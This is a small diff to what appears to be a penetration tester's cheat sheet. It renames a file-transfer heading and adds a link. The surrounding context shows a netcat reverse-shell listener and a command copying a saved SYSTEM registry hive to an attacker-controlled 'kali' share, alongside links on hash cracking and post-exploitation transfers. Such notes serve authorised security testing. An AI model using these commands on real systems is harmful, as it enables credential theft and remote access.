@@ -34,7 +34,6 @@ https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf
 https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/
 
 
-
 Kiosk evasion
 ---
 ```
@@ -86,7 +85,7 @@ nc -lvnp 4444
 rlwrap nc -nnvp 4443
 ```
 
-KALI files transfert
+Files transfert
 ---
 ```
 # Windows <- Kali
@@ -100,6 +99,8 @@ copy system.save \\kali\test\system.save
 ```
 
 https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
+
+https://github.com/timvisee/send-instances/
 
 SmbClient
 ---
